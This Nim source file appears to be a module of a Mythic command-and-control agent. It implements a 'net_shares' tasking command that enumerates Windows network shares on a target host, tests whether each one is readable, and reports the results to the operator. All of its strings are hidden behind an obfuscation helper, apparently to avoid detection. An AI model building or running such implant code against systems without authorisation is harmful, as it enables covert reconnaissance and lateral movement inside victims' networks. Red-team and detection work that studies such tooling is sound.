import std/[json, strformat, os]
import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import winim/lean
  import std/widestrs
  
  const
    NO_ERROR = 0
    STYPE_DISKTREE = 0x00000000'u32
    STYPE_PRINTQ = 0x00000001'u32
    STYPE_DEVICE = 0x00000002'u32
    STYPE_IPC = 0x00000003'u32
    STYPE_SPECIAL = 0x80000000'u32
  
  type
    SHARE_INFO_1 = object
      shi1_netname: LPWSTR
      shi1_type: DWORD
      shi1_remark: LPWSTR
    
    NetShareInformation = object
      computer_name: string
      share_name: string
      comment: string
      share_type: string
      readable: bool
  
  proc NetShareEnum(servername: LPCWSTR, level: DWORD, bufptr: ptr pointer,
                    prefmaxlen: DWORD, entriesread: ptr DWORD,
                    totalentries: ptr DWORD, resume_handle: ptr DWORD): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc NetApiBufferFree(Buffer: pointer): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc utf16PtrToString(p: LPWSTR): string =
    ## Convert UTF-16 pointer to Nim string
    if p.isNil:
      return ""
    result = $cast[WideCString](p)
  
  proc isShareReadable(computerName: string, shareName: string): bool =
    ## Check if a share is readable
    let path = &"\\\\{computerName}\\{shareName}"
    try:
      # Try to list the directory
      for _ in walkDir(path):
        return true
      return true
    except:
      return false

proc netShares*(taskId: string, params: JsonNode): JsonNode =
  ## Enumerate network shares
  when defined(windows):
    try:
      # Parse parameters
      var computerName = ""
      if params.kind == JObject and params.hasKey(obf("computer")):
        computerName = params[obf("computer")].getStr()
      
      # Default to local computer if not specified
      if computerName == "":
        computerName = getEnv(obf("COMPUTERNAME"), obf("Local"))
      
      debug &"[DEBUG] net_shares: computer={computerName}"
      
      var bufPtr: pointer = nil
      var computerNameW: LPCWSTR = nil
      if computerName != "" and computerName != obf("Local"):
        let tempW = newWideCString(computerName)
        computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
      var entriesRead: DWORD = 0
      var totalEntries: DWORD = 0
      var resumeHandle: DWORD = 0
      
      let status = NetShareEnum(
        computerNameW,
        1,  # Level 1 for SHARE_INFO_1
        addr bufPtr,
        DWORD.high,  # Maximum buffer size
        addr entriesRead,
        addr totalEntries,
        addr resumeHandle
      )
      
      var results: seq[NetShareInformation] = @[]
      
      if status == NO_ERROR:
        let shares = cast[ptr UncheckedArray[SHARE_INFO_1]](bufPtr)
        
        for i in 0..<entriesRead.int:
          let shareName = utf16PtrToString(shares[i].shi1_netname)
          let comment = utf16PtrToString(shares[i].shi1_remark)
          
          let shareType = case shares[i].shi1_type.uint32
            of STYPE_DISKTREE:
              obf("Disk Drive")
            of STYPE_PRINTQ:
              obf("Print Queue")
            of STYPE_DEVICE:
              obf("Communication Device")
            of STYPE_IPC:
              obf("Interprocess Communication (IPC)")
            of STYPE_SPECIAL:
              obf("Special Reserved for IPC")
            else:
              &"Unknown type ({shares[i].shi1_type})"
          
          let readable = isShareReadable(computerName, shareName)
          
          results.add(NetShareInformation(
            computer_name: computerName,
            share_name: shareName,
            comment: comment,
            share_type: shareType,
            readable: readable
          ))
        
        # Free the buffer
        discard NetApiBufferFree(bufPtr)
      else:
        results.add(NetShareInformation(
          computer_name: computerName,
          share_name: &"ERROR={status}",
          comment: "",
          share_type: "Unknown",
          readable: false
        ))
      
      # Convert to JSON
      var resultsJson = newJArray()
      for result in results:
        resultsJson.add(%*{
          obf("computer_name"): result.computer_name,
          obf("share_name"): result.share_name,
          obf("comment"): result.comment,
          obf("share_type"): result.share_type,
          obf("readable"): result.readable
        })
      
      return mythicSuccess(taskId, $resultsJson)
      
    except Exception as e:
      return mythicError(taskId, obf("net_shares error: ") & e.msg)
  else:
    return mythicError(taskId, obf("net_shares command is only available on Windows"))